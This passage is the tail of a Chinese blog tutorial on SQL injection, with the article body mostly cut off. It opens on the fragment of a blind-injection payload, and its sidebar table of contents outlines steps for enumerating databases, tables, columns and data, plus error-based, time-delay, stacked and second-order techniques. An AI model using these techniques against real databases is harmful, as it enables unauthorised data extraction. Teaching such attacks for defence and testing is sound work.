0,1),0,1))&gt;97#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>SQL Injection Hacking Flow</p><p><a href="https://resek4.github.io/2019/12/11/sql注入/">https://resek4.github.io/2019/12/11/sql注入/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Resek4</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-12-11</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2023-01-27</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-604b3726d8c18ac5" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/01/11/%E4%BB%8EPHP%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">从 php 代码层面分析文件上传漏洞</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/11/11/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"><span class="level-item">简述密码找回漏洞</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><script src="https://utteranc.es/client.js" repo="Resek4/resek4.github.io" issue-term="pathname" theme="dark-blue" crossorigin="anonymous" async></script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="Resek4"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Resek4</p><p class="is-size-6 is-block">对黑客创意上下求索</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>NightCity</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">31</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Resek4" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Resek4"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/Resek_4"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="https://resek4.github.io/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">March 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">January 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/08/"><span class="level-start"><span class="level-item">August 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">July 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">June 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">May 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">March 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">January 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/09/"><span class="level-start"><span class="level-item">September 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/12/"><span class="level-start"><span class="level-item">December 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">November 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#sql-注入步骤"><span class="level-left"><span class="level-item">1</span><span class="level-item">sql 注入步骤</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#0x00-判断注入点"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">0x00.判断注入点</span></span></a></li><li><a class="level is-mobile" href="#0x01-使用-order-by-语句来判断列数"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">0x01.使用 order by 语句来判断列数</span></span></a></li><li><a class="level is-mobile" href="#0x02-判断回显点"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">0x02.判断回显点</span></span></a></li><li><a class="level is-mobile" href="#0x03-查询数据库名"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">0x03.查询数据库名</span></span></a></li><li><a class="level is-mobile" href="#0x04-查询表名"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">0x04.查询表名</span></span></a></li><li><a class="level is-mobile" href="#0x05-查询列名"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">0x05.查询列名</span></span></a></li><li><a class="level is-mobile" href="#0x06-查询数据"><span class="level-left"><span class="level-item">1.7</span><span class="level-item">0x06.查询数据</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sql-注入技巧"><span class="level-left"><span class="level-item">2</span><span class="level-item">sql 注入技巧</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#0x00-Tips"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">0x00.Tips</span></span></a></li><li><a class="level is-mobile" href="#0x01-亦或注入"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">0x01.亦或注入</span></span></a></li><li><a class="level is-mobile" href="#0x02-报错注入"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">0x02.报错注入</span></span></a></li><li><a class="level is-mobile" href="#0x03-可以使用语句辅助注入"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">0x03.可以使用语句辅助注入</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#substr-str-start-long"><span class="level-left"><span class="level-item">2.4.1</span><span class="level-item">substr(str,start,long)</span></span></a></li><li><a class="level is-mobile" href="#if-exp1-exp2-exp3"><span class="level-left"><span class="level-item">2.4.2</span><span class="level-item">if(exp1,exp2,exp3)</span></span></a></li><li><a class="level is-mobile" href="#语句替换"><span class="level-left"><span class="level-item">2.4.3</span><span class="level-item">语句替换</span></span></a></li></ul></li><li><a class="level is-mobile" href="#0x04-使用延迟注入"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">0x04.使用延迟注入</span></span></a></li><li><a class="level is-mobile" href="#0x05-堆叠注入"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">0x05.堆叠注入</span></span></a></li><li><a class="level is-mobile" href="#0x06-更改表名列名为本身就能回显的来查询"><span class="level-left"><span class="level-item">2.7</span><span class="level-item">0x06.更改表名列名为本身就能回显的来查询</span></span></a></li><li><a class="level is-mobile" href="#0x07-二次注入"><span class="level-left"><span class="level-item">2.8</span><span class="level-item">0x07.二次注入</span></span></a></li><li><a class="level is-mobile" href="#盲注"><span class="level-left"><span class="level-item">2.9</span><span class="level-item">盲注</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#原理"><span class="level-left"><span class="level-item">2.9.1</span><span class="level-item">原理</span></span></a></li><li><a class="level is-mobile" href="#操作"><span class="level-left"><span class="level-item">2.9.2</span><span class="level-item">操作</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/HackStyle/"><span class="level-start"><span class="level-item">HackStyle</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/Penetration/"><span class="level-start"><span class="level-item">Penetration</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile" href="/categories/TechLearning/"><span class="level-start"><span class="level-item">TechLearning</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/Toolkit/"><span class="level-start"><span class="level-item">Toolkit</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-03-30T23:02:00.000Z">2023-03-31</time></p><p class="title"><a href="/2023/03/31/SD-prompting/">元素法师的修习日志-SD/NovelAI Prompt写法总览</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-09T16:00:00.000Z">2023-01-10</time></p><p class="title"><a href="/2023/01/10/Git/">GIT:A boon for open-source developers who need to collaborate on code.</a></p><p class="categories"><a href="/categories/TechLearning/">TechLearning</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-30T16:00:00.000Z">2022-12-31</time></p><p class="title"><a href="/2022/12/31/fzf/">fzf(Fuzzy File Finder) enhances the efficiency and convenience of your command-line workflow.</a></p><p class="categories"><a href="/categories/Toolkit/">Toolkit</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-08T16:00:00.000Z">2022-12-09</time></p><p class="title"><a href="/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/">使用 Raspberry Pi 搭建 Kodi 家庭影院</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-06T16:00:00.000Z">2022-12-07</time></p><p class="title"><a href="/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/">使用 Raspberry Pi 自建 MinIO 图床</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.jpg" alt="Resek&#039;s Kingdom" height="28"></a><p class="is-size-7"><span>&copy; 2023 Resek4</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Resek4"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>